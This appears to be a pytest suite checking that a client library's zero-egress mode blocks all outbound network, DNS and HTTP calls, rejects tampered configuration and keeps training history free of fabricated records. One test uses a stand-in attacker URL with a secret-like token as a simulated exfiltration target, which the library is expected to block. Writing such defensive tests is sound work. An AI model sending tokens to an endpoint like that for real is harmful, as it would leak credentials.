"""Empirical Adversarial Challenge Suite for Gate E: True Zero-Egress Enforcement.

Tests 6 specific adversarial attack vectors:
1. Socket & DNS Interception Attack:
   Traps socket.socket.connect, connect_ex, send, sendto, sendall,
   socket.getaddrinfo, socket.gethostbyname, urllib.request.urlopen,
   HTTPConnection.connect, HTTPSConnection.connect.
   Validates that 0 outbound network packets leave the host across all client methods
   (systemone, compare, passthrough, auto_cutover, call_real_typesafe_api, AsyncTypeSafeClient).
2. Silent Fallback Poisoning Attack:
   Attempts to poison the apprentice training history under zero_egress=False when
   fallback_baseline=False by injecting simulated network/HTTP failures.
   Verifies that hard exceptions are raised and 0 fake/simulated exemplars enter apprentice history.
3. Configuration Bypass Attack:
   Attacks fail-closed configuration validation in TypeSafeClient and AsyncTypeSafeClient
   via obscure kwargs, boolean coercions, conflicting keyword overrides, invalid modes,
   and post-construction attribute tampering.
4. Egress Audit Log Forensics & Leak Detection:
   Validates that zero-egress operations produce 0 egress audit records, while genuine egress
   produces complete forensic audit records, and verifies thread-safe logging.
5. High-Concurrency & Async Race Condition Stress Harness:
   Spawns multi-threaded and async workers hammering client evaluation and blocked egress
   under concurrent load, proving zero race-condition egress leaks.
6. Twin Namespace & Patch Boundary Verification:
   Ensures reflex and system1 namespaces, as well as patch_typesafe, enforce identical
   zero-egress contracts and fail-closed behaviors.
"""

from __future__ import annotations

import asyncio
import collections
import concurrent.futures
import http.client
import inspect
import json
import os
import socket
import threading
import urllib.error
import urllib.request
from typing import Any, Dict, List, Mapping, Optional, Sequence, Tuple

import pytest

import reflex
import reflex.compat.typesafe as system1_typesafe
import system1
import system1.compat.typesafe as s1_typesafe
from system1.compat.typesafe import (
    AsyncTypeSafeClient,
    Choice,
    TypeSafeClient,
    TypeSafeResponse,
    ZeroEgressViolationError,
    batch_system_one,
    batch_systemone,
    call_real_typesafe_api,
    clear_egress_audit_log,
    compare,
    evaluate,
    get_egress_audit_log,
    patch_typesafe,
    system_one,
    systemone,
)


# ============================================================================
# Network Interception Trap Fixture
# ============================================================================

@pytest.fixture
def network_trap(monkeypatch):
    """Rigorous interception trap monitoring all standard socket, DNS, and HTTP entry points.

    If any code attempts an outbound network call, this fixture records the call details
    and immediately raises an AssertionError, guaranteeing that 0 packets leave the host.
    """
    intercepted_calls: List[Tuple[str, tuple, dict]] = []

    def make_trap(func_name: str):
        def _trap(*args, **kwargs):
            record = (func_name, args, kwargs)
            intercepted_calls.append(record)
            raise AssertionError(
                f"EGRESS TRAP TRIGGERED: Outbound network call to {func_name} intercepted! "
                f"args={args[:2]!r}, kwargs={list(kwargs.keys())!r}"
            )
        return _trap

    orig_connect = socket.socket.connect
    orig_connect_ex = socket.socket.connect_ex
    orig_send = socket.socket.send
    orig_sendto = socket.socket.sendto
    orig_sendall = socket.socket.sendall

    def trap_connect(self, *args, **kwargs):
        if getattr(self, "family", None) in (socket.AF_INET, getattr(socket, "AF_INET6", None)):
            record = ("socket.connect", args, kwargs)
            intercepted_calls.append(record)
            raise AssertionError(f"EGRESS TRAP TRIGGERED: socket.connect intercepted! args={args[:1]!r}")
        return orig_connect(self, *args, **kwargs)

    def trap_connect_ex(self, *args, **kwargs):
        if getattr(self, "family", None) in (socket.AF_INET, getattr(socket, "AF_INET6", None)):
            record = ("socket.connect_ex", args, kwargs)
            intercepted_calls.append(record)
            raise AssertionError(f"EGRESS TRAP TRIGGERED: socket.connect_ex intercepted! args={args[:1]!r}")
        return orig_connect_ex(self, *args, **kwargs)

    def trap_send(self, *args, **kwargs):
        if getattr(self, "family", None) in (socket.AF_INET, getattr(socket, "AF_INET6", None)):
            record = ("socket.send", args, kwargs)
            intercepted_calls.append(record)
            raise AssertionError(f"EGRESS TRAP TRIGGERED: socket.send intercepted! args={args[:1]!r}")
        return orig_send(self, *args, **kwargs)

    def trap_sendto(self, *args, **kwargs):
        if getattr(self, "family", None) in (socket.AF_INET, getattr(socket, "AF_INET6", None)):
            record = ("socket.sendto", args, kwargs)
            intercepted_calls.append(record)
            raise AssertionError(f"EGRESS TRAP TRIGGERED: socket.sendto intercepted! args={args[:1]!r}")
        return orig_sendto(self, *args, **kwargs)

    def trap_sendall(self, *args, **kwargs):
        if getattr(self, "family", None) in (socket.AF_INET, getattr(socket, "AF_INET6", None)):
            record = ("socket.sendall", args, kwargs)
            intercepted_calls.append(record)
            raise AssertionError(f"EGRESS TRAP TRIGGERED: socket.sendall intercepted! args={args[:1]!r}")
        return orig_sendall(self, *args, **kwargs)

    monkeypatch.setattr(socket.socket, "connect", trap_connect)
    monkeypatch.setattr(socket.socket, "connect_ex", trap_connect_ex)
    monkeypatch.setattr(socket.socket, "send", trap_send)
    monkeypatch.setattr(socket.socket, "sendto", trap_sendto)
    monkeypatch.setattr(socket.socket, "sendall", trap_sendall)

    # DNS & HTTP traps
    for target_obj, method_name in [
        (socket, "getaddrinfo"),
        (socket, "gethostbyname"),
        (socket, "gethostbyname_ex"),
        (urllib.request, "urlopen"),
        (http.client.HTTPConnection, "connect"),
        (http.client.HTTPSConnection, "connect"),
    ]:
        monkeypatch.setattr(target_obj, method_name, make_trap(f"{target_obj.__name__}.{method_name}"))

    yield intercepted_calls

    assert len(intercepted_calls) == 0, (
        f"Network trap detected {len(intercepted_calls)} unauthorized outbound network calls! "
        f"Calls: {intercepted_calls}"
    )


# ============================================================================
# Attack 1: Socket & DNS Interception Attack (Zero WAN Egress Verification)
# ============================================================================

class TestAttack1SocketInterception:
    """Adversarially trap all network and DNS calls to prove 0 packets leave the host."""

    def test_call_real_typesafe_api_blocks_before_dns_and_socket(self, network_trap):
        """Prove call_real_typesafe_api raises ZeroEgressViolationError without touching socket/DNS."""
        questions = {"route": Choice("Route", {"a": "Alpha", "b": "Beta"})}

        # 1. Standard call
        with pytest.raises(ZeroEgressViolationError, match="zero_egress=True"):
            call_real_typesafe_api(
                "Route request payload",
                questions,
                api_key="sk-test-fake",
                base_url="https://api.typesafe.ai/v1",
                zero_egress=True,
            )
        assert len(network_trap) == 0

        # 2. Malicious exfiltration base_url
        with pytest.raises(ZeroEgressViolationError, match="zero_egress=True"):
            call_real_typesafe_api(
                "Exfiltration target test",
                questions,
                api_key="secret-token-exfil",
                base_url="https://evil-exfil-sink.attacker.com/v1",
                zero_egress=True,
            )
        assert len(network_trap) == 0

        # 3. Localhost WAN spoofing
        with pytest.raises(ZeroEgressViolationError, match="zero_egress=True"):
            call_real_typesafe_api(
                "Localhost spoofing",
                questions,
                base_url="http://127.0.0.1:8080/v1",
                zero_egress=True,
                fallback_baseline=True,
            )
        assert len(network_trap) == 0

    def test_typesafe_client_sync_methods_zero_egress(self, network_trap):
        """Prove all synchronous TypeSafeClient execution paths perform 0 network calls."""
        client = TypeSafeClient(mode="local", zero_egress=True)
        questions = {"tier": Choice("Tier", {"fast": "Fast", "smart": "Smart"})}

        # systemone
        resp = client.systemone("Classify query 1", questions)
        assert resp is not None
        assert getattr(resp, "local_execution", True) is True
        assert getattr(resp, "egress_bytes", 0) == 0

        # method aliases
        resp_so = client.system_one("Classify query 2", questions)
        assert resp_so.egress_bytes == 0
        resp_dec = client.decide("Classify query 3", questions)
        assert resp_dec.egress_bytes == 0
        resp_eval = client.evaluate("Classify query 4", questions)
        assert resp_eval.egress_bytes == 0

        # batch_systemone
        batch_resps = client.batch_systemone(["Batch prompt 1", "Batch prompt 2"], questions)
        assert len(batch_resps) == 2
        for r in batch_resps:
            assert r.egress_bytes == 0

        # compare() must fail closed
        with pytest.raises(ZeroEgressViolationError, match="zero_egress=True"):
            client.compare("Compare prompt", questions)

        # call_real_api() must fail closed
        with pytest.raises(ZeroEgressViolationError, match="zero_egress=True"):
            client.call_real_api("Real API call", questions)

        assert len(network_trap) == 0

    @pytest.mark.asyncio
    async def test_async_typesafe_client_zero_egress(self, network_trap):
        """Prove all AsyncTypeSafeClient execution paths perform 0 network calls."""
        async_client = AsyncTypeSafeClient(mode="local", zero_egress=True)
        questions = {"status": Choice("Status", {"ok": "OK", "warn": "Warning"})}

        # async systemone
        resp = await async_client.systemone("Async prompt 1", questions)
        assert resp is not None
        assert getattr(resp, "egress_bytes", 0) == 0

        # async batch_systemone
        batch_resps = await async_client.batch_systemone(["Async batch 1", "Async batch 2"], questions)
        assert len(batch_resps) == 2
        for r in batch_resps:
            assert r.egress_bytes == 0

        # async compare() must fail closed
        with pytest.raises(ZeroEgressViolationError, match="zero_egress=True"):
            await async_client.compare("Async compare prompt", questions)

        # async call_real_api() must fail closed
        with pytest.raises(ZeroEgressViolationError, match="zero_egress=True"):
            await async_client.call_real_api("Async real API call", questions)

        assert len(network_trap) == 0

    def test_auto_cutover_with_local_baseline_handler_zero_egress(self, network_trap):
        """Verify auto_cutover mode with an in-process baseline handler triggers 0 network calls."""
        def local_mock_teacher(state: str, questions: Mapping[str, Any]) -> TypeSafeResponse:
            return TypeSafeResponse({
                "answers": {"tier": {"value": "fast", "confidence": 0.98}},
                "latency_ms": 0.5,
                "local_execution": True,
                "egress_bytes": 0,
            })

        client = TypeSafeClient(
            mode="auto_cutover",
            cutover_threshold=3,
            baseline_handler=local_mock_teacher,
            zero_egress=True,
        )
        questions = {"tier": Choice("Tier", {"fast": "Fast", "smart": "Smart"})}

        # Run queries through apprenticeship
        for i in range(3):
            resp = client.systemone(f"Apprentice query {i}", questions)
            assert resp.egress_bytes == 0
            assert resp.auto_cutover_active is True

        assert len(network_trap) == 0

    def test_top_level_functional_apis_zero_egress(self, network_trap):
        """Verify functional module-level APIs (system_one, batch_system_one, compare) enforce zero egress."""
        questions = {"flag": Choice("Flag", {"yes": "Yes", "no": "No"})}

        # system_one, systemone, evaluate
        r1 = system_one("Functional 1", questions)
        assert r1.egress_bytes == 0
        r2 = systemone("Functional 2", questions)
        assert r2.egress_bytes == 0
        r3 = evaluate("Functional 3", questions)
        assert r3.egress_bytes == 0

        # batch_system_one, batch_systemone
        br1 = batch_system_one(["Batch A", "Batch B"], questions)
        assert len(br1) == 2
        br2 = batch_systemone(["Batch C"], questions)
        assert len(br2) == 1

        # compare() default zero_egress=True
        with pytest.raises(ZeroEgressViolationError, match="zero_egress=True"):
            compare("Compare functional", questions)

        assert len(network_trap) == 0

    def test_twin_namespace_system1_zero_egress(self, network_trap):
        """Verify reflex namespace exports enforce identical zero-egress guarantees."""
        questions = {"action": Choice("Action", {"allow": "Allow", "deny": "Deny"})}

        with pytest.raises(reflex.ZeroEgressViolationError, match="zero_egress=True"):
            system1_typesafe.call_real_typesafe_api("System 1 call", questions, zero_egress=True)

        client = reflex.TypeSafeClient(mode="local", zero_egress=True)
        resp = client.systemone("System 1 client call", questions)
        assert resp.egress_bytes == 0

        with pytest.raises(reflex.ZeroEgressViolationError, match="zero_egress=True"):
            client.compare("System 1 compare", questions)

        assert len(network_trap) == 0

    def test_in_memory_patched_typesafe_module_zero_egress(self, network_trap):
        """Verify patch_typesafe(mode='local') strictly traps and enforces zero egress."""
        questions = {"decision": Choice("Decision", {"pass": "Pass", "fail": "Fail"})}

        with patch_typesafe(mode="local"):
            import typesafe  # type: ignore

            patched_client = typesafe.Client()
            resp = patched_client.systemone("Patched prompt", questions)
            assert resp.egress_bytes == 0

            with pytest.raises(ZeroEgressViolationError, match="zero_egress=True"):
                typesafe.compare("Patched compare", questions)

            with pytest.raises(ZeroEgressViolationError, match="zero_egress=True"):
                typesafe.call_real_typesafe_api("Patched API", questions, zero_egress=True)

        assert len(network_trap) == 0


# ============================================================================
# Attack 2: Silent Fallback Poisoning Attack (Apprentice History Integrity)
# ============================================================================

class TestAttack2SilentFallbackPoisoning:
    """Attempt to poison apprentice training history under failing network conditions.

    When zero_egress=False and fallback_baseline=False, any network failure must
    raise a hard error rather than fabricating synthetic fallback data into history.
    """

    def test_call_real_typesafe_api_hard_exception_on_http_500(self, monkeypatch):
        """Inject HTTP 500: verify call_real_typesafe_api raises HTTPError with fallback_baseline=False."""
        def mock_urlopen_500(req, timeout=15.0):
            raise urllib.error.HTTPError(
                url=req.full_url,
                code=500,
                msg="Internal Server Error: Cloud Jev Crashed",
                hdrs=http.client.HTTPMessage(),
                fp=None,
            )

        monkeypatch.setattr(urllib.request, "urlopen", mock_urlopen_500)
        questions = {"tier": Choice("Tier", {"fast": "Fast", "smart": "Smart"})}

        with pytest.raises(urllib.error.HTTPError) as exc_info:
            call_real_typesafe_api(
                "Poison test prompt",
                questions,
                zero_egress=False,
                fallback_baseline=False,
            )
        assert exc_info.value.code == 500

    def test_call_real_typesafe_api_hard_exception_on_network_timeout(self, monkeypatch):
        """Inject socket timeout: verify call_real_typesafe_api raises TimeoutError / URLError."""
        def mock_urlopen_timeout(req, timeout=15.0):
            raise urllib.error.URLError(socket.timeout("WAN connection timed out"))

        monkeypatch.setattr(urllib.request, "urlopen", mock_urlopen_timeout)
        questions = {"tier": Choice("Tier", {"fast": "Fast", "smart": "Smart"})}

        with pytest.raises(urllib.error.URLError) as exc_info:
            call_real_typesafe_api(
                "Poison timeout prompt",
                questions,
                zero_egress=False,
                fallback_baseline=False,
            )
        assert "timed out" in str(exc_info.value)

    def test_call_real_typesafe_api_hard_exception_on_connection_refused(self, monkeypatch):
        """Inject ConnectionRefused: verify hard exception raised without synthetic data."""
        def mock_urlopen_refused(req, timeout=15.0):
            raise urllib.error.URLError(ConnectionRefusedError("Connection refused by peer"))

        monkeypatch.setattr(urllib.request, "urlopen", mock_urlopen_refused)
        questions = {"tier": Choice("Tier", {"fast": "Fast", "smart": "Smart"})}

        with pytest.raises(urllib.error.URLError) as exc_info:
            call_real_typesafe_api(
                "Poison connection refused prompt",
                questions,
                zero_egress=False,
                fallback_baseline=False,
            )
        assert "Connection refused" in str(exc_info.value)

    def test_auto_cutover_history_remains_unpoisoned_on_transport_failure(self, monkeypatch):
        """Crucial invariant: Network failures must NEVER append fake baseline records to apprentice history."""
        def mock_failing_urlopen(req, timeout=15.0):
            raise urllib.error.HTTPError(
                url=req.full_url,
                code=503,
                msg="Service Unavailable: Upstream Outage",
                hdrs=http.client.HTTPMessage(),
                fp=None,
            )

        monkeypatch.setattr(urllib.request, "urlopen", mock_failing_urlopen)

        # Instantiate auto_cutover client with fallback_baseline=False
        client = TypeSafeClient(
            mode="auto_cutover",
            cutover_threshold=5,
            zero_egress=False,
            fallback_baseline=False,
        )
        questions = {"tier": Choice("Tier", {"fast": "Fast", "smart": "Smart"})}

        # Attempt to run queries under failing network
        for i in range(10):
            with pytest.raises(urllib.error.HTTPError):
                client.systemone(f"Malicious poison query {i}", questions)

        # Assert apprentice dataset remains completely clean
        assert len(client._history) == 0, "Apprentice history was poisoned by failed network queries!"
        assert client.call_count == 0
        assert client.is_cutover is False
        assert client.compiled_model is None

        # Forced cutover distillation must fail due to zero samples
        cutover_success = client.distill_and_cutover(questions)
        assert cutover_success is False
        assert client.is_cutover is False

    @pytest.mark.asyncio
    async def test_async_auto_cutover_history_remains_unpoisoned(self, monkeypatch):
        """Verify AsyncTypeSafeClient does not poison history under failing network."""
        def mock_failing_urlopen(req, timeout=15.0):
            raise urllib.error.URLError(ConnectionResetError("Connection reset by peer"))

        monkeypatch.setattr(urllib.request, "urlopen", mock_failing_urlopen)

        async_client = AsyncTypeSafeClient(
            mode="auto_cutover",
            cutover_threshold=5,
            zero_egress=False,
            fallback_baseline=False,
        )
        questions = {"tier": Choice("Tier", {"fast": "Fast", "smart": "Smart"})}

        with pytest.raises(urllib.error.URLError):
            await async_client.systemone("Async poison query", questions)

        assert len(async_client._sync_client._history) == 0
        assert async_client.call_count == 0
        assert async_client.is_cutover is False

    def test_passthrough_mode_hard_exception_no_silent_fallback(self, monkeypatch):
        """In passthrough mode with fallback_baseline=False, errors bubble up without synthetic responses."""
        def mock_failing_urlopen(req, timeout=15.0):
            raise urllib.error.HTTPError(
                url=req.full_url,
                code=401,
                msg="Unauthorized API Key",
                hdrs=http.client.HTTPMessage(),
                fp=None,
            )

        monkeypatch.setattr(urllib.request, "urlopen", mock_failing_urlopen)

        client = TypeSafeClient(
            mode="passthrough",
            zero_egress=False,
            fallback_baseline=False,
        )
        questions = {"action": Choice("Action", {"buy": "Buy", "sell": "Sell"})}

        with pytest.raises(urllib.error.HTTPError) as exc_info:
            client.systemone("Passthrough poison query", questions)
        assert exc_info.value.code == 401


# ============================================================================
# Attack 3: Configuration Bypass Attack (Fail-Closed Construction Rigor)
# ============================================================================

class TestAttack3ConfigurationBypass:
    """Attacks against fail-closed constructor constraints and state validation."""

    def test_passthrough_with_zero_egress_fails_closed(self):
        """mode='passthrough' with zero_egress=True must fail closed immediately."""
        # 1. Default zero_egress
        with pytest.raises(ValueError, match="mode='passthrough' requires network egress"):
            TypeSafeClient(mode="passthrough")

        # 2. Explicit zero_egress=True
        with pytest.raises(ValueError, match="mode='passthrough' requires network egress"):
            TypeSafeClient(mode="passthrough", zero_egress=True)

        # 3. Truthy integer zero_egress=1
        with pytest.raises(ValueError, match="mode='passthrough' requires network egress"):
            TypeSafeClient(mode="passthrough", zero_egress=1)

        # 4. Truthy string in kwargs
        with pytest.raises(ValueError, match="mode='passthrough' requires network egress"):
            TypeSafeClient(mode="passthrough", **{"zero_egress": "yes"})

        # 5. Async client parity
        with pytest.raises(ValueError, match="mode='passthrough' requires network egress"):
            AsyncTypeSafeClient(mode="passthrough")

        with pytest.raises(ValueError, match="mode='passthrough' requires network egress"):
            AsyncTypeSafeClient(mode="passthrough", zero_egress=True)

    def test_auto_cutover_without_handler_and_zero_egress_fails_closed(self):
        """mode='auto_cutover' with zero_egress=True requires explicit baseline_handler."""
        # 1. Default zero_egress without handler
        with pytest.raises(ValueError, match="mode='auto_cutover' with zero_egress=True requires a local baseline_handler"):
            TypeSafeClient(mode="auto_cutover")

        # 2. Explicit zero_egress=True and baseline_handler=None
        with pytest.raises(ValueError, match="mode='auto_cutover' with zero_egress=True requires a local baseline_handler"):
            TypeSafeClient(mode="auto_cutover", zero_egress=True, baseline_handler=None)

        # 3. Async client parity
        with pytest.raises(ValueError, match="mode='auto_cutover' with zero_egress=True requires a local baseline_handler"):
            AsyncTypeSafeClient(mode="auto_cutover")

        with pytest.raises(ValueError, match="mode='auto_cutover' with zero_egress=True requires a local baseline_handler"):
            AsyncTypeSafeClient(mode="auto_cutover", zero_egress=True, baseline_handler=None)

    def test_allow_cloud_fallback_with_zero_egress_fails_closed(self):
        """allow_cloud_fallback=True cannot be combined with zero_egress=True."""
        # 1. Default zero_egress=True
        with pytest.raises(ValueError, match="allow_cloud_fallback=True cannot be combined with zero_egress=True"):
            TypeSafeClient(allow_cloud_fallback=True)

        # 2. Explicit zero_egress=True
        with pytest.raises(ValueError, match="allow_cloud_fallback=True cannot be combined with zero_egress=True"):
            TypeSafeClient(mode="local", allow_cloud_fallback=True, zero_egress=True)

        # 3. Truthy kwargs override
        with pytest.raises(ValueError, match="allow_cloud_fallback=True cannot be combined with zero_egress=True"):
            TypeSafeClient(mode="local", **{"allow_cloud_fallback": 1, "zero_egress": 1})

        # 4. Async client parity
        with pytest.raises(ValueError, match="allow_cloud_fallback=True cannot be combined with zero_egress=True"):
            AsyncTypeSafeClient(allow_cloud_fallback=True)

    def test_conflicting_kwargs_precedence(self):
        """Verify kwargs override takes precedence and fails closed."""
        # Positional zero_egress=False but kwargs['zero_egress'] = True raises TypeError (duplicate kwarg)
        with pytest.raises(TypeError):
            TypeSafeClient(mode="passthrough", zero_egress=False, **{"zero_egress": True})

        # Passing contradictory config via kwargs dictionary
        with pytest.raises(ValueError, match="allow_cloud_fallback=True cannot be combined with zero_egress=True"):
            TypeSafeClient(mode="local", **{"allow_cloud_fallback": True, "zero_egress": True})

    def test_invalid_modes_fail_closed(self):
        """Verify unrecognized modes are rejected immediately."""
        invalid_modes = ["", "cloud", "remote", "LOCAL", "Passthrough", "auto", None, 123]
        for bad_mode in invalid_modes:
            with pytest.raises((ValueError, TypeError)):
                TypeSafeClient(mode=bad_mode)

    def test_post_construction_attribute_tampering_fails_closed(self):
        """If an attacker mutates client attributes after __init__, runtime checks fail closed."""
        client = TypeSafeClient(mode="local", zero_egress=True)
        questions = {"tier": Choice("Tier", {"fast": "Fast", "smart": "Smart"})}

        # Tamper mode to passthrough
        client.mode = "passthrough"
        with pytest.raises(ZeroEgressViolationError, match="mode='passthrough' requires network egress"):
            client.systemone("Tampered passthrough prompt", questions)

        # Tamper mode to auto_cutover without handler
        client.mode = "auto_cutover"
        client.baseline_handler = None
        client._has_cutover = False
        with pytest.raises(ZeroEgressViolationError, match="mode='auto_cutover' with zero_egress=True requires a local baseline_handler"):
            client.systemone("Tampered auto_cutover prompt", questions)

    def test_post_construction_cloud_fallback_tampering_abstains_offline(self, monkeypatch):
        """If an attacker forces allow_cloud_fallback=True on a zero_egress client, drift triggers offline abstention."""
        client = TypeSafeClient(mode="local", zero_egress=True)
        client.allow_cloud_fallback = True  # Tampered attribute

        # Force drift property to True
        monkeypatch.setattr(type(client._drift_detector), "is_drifted", property(lambda self: True))
        questions = {"tier": Choice("Tier", {"fast": "Fast", "smart": "Smart"})}

        resp = client.systemone("Drifted query with tampered fallback", questions)
        assert resp["abstain"] is True
        assert resp["verdict"] == "REQUIRE_APPROVAL"
        assert resp["status"] == "ABSTAINED_DRIFT"
        assert resp["egress_bytes"] == 0
        assert resp.get("fallback_routed") is not True

    def test_functional_apis_fail_closed_on_invalid_configs(self):
        """Top-level functional wrappers fail closed when configured with invalid parameters."""
        questions = {"tier": Choice("Tier", {"fast": "Fast", "smart": "Smart"})}

        with pytest.raises(ValueError, match="mode='passthrough' requires network egress"):
            system_one("Prompt", questions, mode="passthrough")

        with pytest.raises(ValueError, match="allow_cloud_fallback=True cannot be combined with zero_egress=True"):
            system_one("Prompt", questions, allow_cloud_fallback=True)

        with pytest.raises(ValueError, match="mode='passthrough' requires network egress"):
            batch_system_one(["Prompt"], questions, mode="passthrough")


# ============================================================================
# Attack 4: Egress Audit Log Forensics & Leak Detection
# ============================================================================

class TestAttack4AuditLogForensics:
    """Forensic verification: zero-egress executions leave 0 audit records, genuine egress records complete traces."""

    def test_zero_egress_operations_produce_zero_audit_records(self):
        """Verify _EGRESS_AUDIT_LOG remains completely untouched during zero-egress executions."""
        clear_egress_audit_log()
        assert len(get_egress_audit_log()) == 0

        client = TypeSafeClient(mode="local", zero_egress=True)
        questions = {"status": Choice("Status", {"ok": "OK", "err": "Error"})}

        # Run 10 queries
        for i in range(10):
            client.systemone(f"Audit log verification query {i}", questions)

        # Run batch query
        client.batch_systemone(["Batch 1", "Batch 2"], questions)

        # Attempt blocked calls
        with pytest.raises(ZeroEgressViolationError):
            client.compare("Compare attempt", questions)

        with pytest.raises(ZeroEgressViolationError):
            call_real_typesafe_api("Direct call", questions, zero_egress=True)

        # Forensic proof: 0 entries in audit log
        log_entries = get_egress_audit_log()
        assert len(log_entries) == 0, f"Expected 0 audit log records, found {len(log_entries)}!"

    def test_genuine_egress_records_complete_forensic_audit(self):
        """When egress is intentionally permitted (zero_egress=False), verify audit log fidelity."""
        clear_egress_audit_log()

        call_real_typesafe_api(
            "Forensic egress record prompt",
            {"flag": Choice("Flag", {"a": "A", "b": "B"})},
            api_key="audit-test-key",
            base_url="https://api.typesafe.ai/v1",
            zero_egress=False,
            fallback_baseline=True,
            timeout=0.2,
        )

        entries = get_egress_audit_log()
        assert len(entries) >= 1
        entry = entries[-1]

        # Audit schema validation
        assert "timestamp" in entry
        assert entry["destination_host"] == "api.typesafe.ai"
        assert entry["destination_port"] == 443
        assert entry["payload_bytes"] > 0
        assert entry["operation_type"] == "typesafe_wan_call"
        assert entry["bytes_out"] == entry["payload_bytes"]
        assert entry["host"] == "api.typesafe.ai"
        assert entry["port"] == 443
        assert "/v1/systemone" in entry["endpoint"]

        clear_egress_audit_log()
        assert len(get_egress_audit_log()) == 0


# ============================================================================
# Attack 5: High-Concurrency & Async Race Condition Stress Harness
# ============================================================================

class TestAttack5ConcurrencyStressHarness:
    """Stress tests under high concurrent load to detect race conditions in zero-egress enforcement."""

    def test_multi_threaded_systemone_zero_egress_concurrency(self, network_trap):
        """50 concurrent threads executing local systemone: verify 0 network calls and 0 data races."""
        client = TypeSafeClient(mode="local", zero_egress=True)
        questions = {"priority": Choice("Priority", {"low": "Low", "high": "High"})}

        def worker_task(thread_id: int):
            resp = client.systemone(f"Thread worker prompt {thread_id}", questions)
            assert resp is not None
            assert resp.egress_bytes == 0
            return thread_id

        num_threads = 40
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(worker_task, i) for i in range(num_threads)]
            results = [f.result(timeout=10.0) for f in concurrent.futures.as_completed(futures)]

        assert len(results) == num_threads
        assert len(network_trap) == 0

    def test_multi_threaded_blocked_egress_concurrency(self, network_trap):
        """40 concurrent threads attempting call_real_typesafe_api with zero_egress=True."""
        questions = {"tier": Choice("Tier", {"fast": "Fast", "smart": "Smart"})}

        def attack_worker(worker_id: int):
            try:
                call_real_typesafe_api(
                    f"Concurrency attack payload {worker_id}",
                    questions,
                    zero_egress=True,
                )
                return False
            except ZeroEgressViolationError:
                return True

        num_workers = 40
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
            futures = [executor.submit(attack_worker, i) for i in range(num_workers)]
            results = [f.result(timeout=10.0) for f in concurrent.futures.as_completed(futures)]

        assert all(results), "At least one concurrent worker bypassed ZeroEgressViolationError!"
        assert len(network_trap) == 0

    @pytest.mark.asyncio
    async def test_async_concurrent_gather_stress(self, network_trap):
        """50 async tasks running concurrently under AsyncTypeSafeClient."""
        async_client = AsyncTypeSafeClient(mode="local", zero_egress=True)
        questions = {"route": Choice("Route", {"direct": "Direct", "queue": "Queue"})}

        async def async_worker(task_id: int):
            resp = await async_client.systemone(f"Async worker payload {task_id}", questions)
            assert resp.egress_bytes == 0
            return task_id

        tasks = [async_worker(i) for i in range(50)]
        results = await asyncio.gather(*tasks)
        assert len(results) == 50
        assert len(network_trap) == 0


# ============================================================================
# Attack 6: Twin Namespace & Patch Boundary Stress Tests
# ============================================================================

class TestAttack6NamespaceAndPatchBoundary:
    """Stress tests verifying identical zero-egress semantics across twin namespaces and patching."""

    def test_reflex_and_system1_class_identity_and_contracts(self):
        """Verify exact type equivalence between system1 and reflex modules."""
        assert system1.ZeroEgressViolationError is reflex.ZeroEgressViolationError
        assert system1.ZeroEgressViolationError is s1_typesafe.ZeroEgressViolationError
        assert reflex.ZeroEgressViolationError is system1_typesafe.ZeroEgressViolationError
        assert issubclass(ZeroEgressViolationError, RuntimeError)

    def test_patch_typesafe_unpatching_lifecycle_and_nesting(self, network_trap):
        """Verify patch_typesafe correctly nests, cleans up, and retains zero-egress guarantees."""
        questions = {"flag": Choice("Flag", {"0": "Zero", "1": "One"})}

        # Nested patch context managers
        with patch_typesafe(mode="local"):
            import typesafe  # type: ignore
            c1 = typesafe.Client(zero_egress=True)
            r1 = c1.systemone("Level 1 prompt", questions)
            assert r1.egress_bytes == 0

            with patch_typesafe(mode="local"):
                import typesafe_sdk  # type: ignore
                c2 = typesafe_sdk.Client(zero_egress=True)
                r2 = c2.systemone("Level 2 prompt", questions)
                assert r2.egress_bytes == 0

                with pytest.raises(ZeroEgressViolationError):
                    typesafe_sdk.compare("Nested compare", questions)

            # Back to level 1
            r3 = c1.systemone("Back to level 1", questions)
            assert r3.egress_bytes == 0

        assert len(network_trap) == 0
